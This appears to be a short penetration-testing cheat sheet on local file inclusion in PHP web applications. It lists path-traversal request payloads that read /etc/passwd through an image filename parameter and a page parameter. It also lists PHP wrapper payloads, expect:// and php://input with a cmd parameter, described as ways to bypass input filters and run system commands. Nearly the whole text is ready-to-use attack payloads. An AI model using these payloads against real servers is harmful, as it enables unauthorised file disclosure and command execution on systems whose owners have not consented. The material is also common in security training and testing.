```
Image file LFI
GET /image?filename=31.jpg
GET /image?filename=../../../etc/passwd

/script.php?page=index.html
/script.php?page=../../../../../../../../etc/passwd

PHP Wrappers
PHP has a number of wrappers that can often be abused to bypass various input filters.
PHP Expect Wrapper
PHP expect:// allows execution of system commands, unfortunately the expect PHP module is not enabled by default.
php?page=expect://ls

The payload is sent in a POST request to the server such as:
/fi/?page=php://input&cmd=ls

```
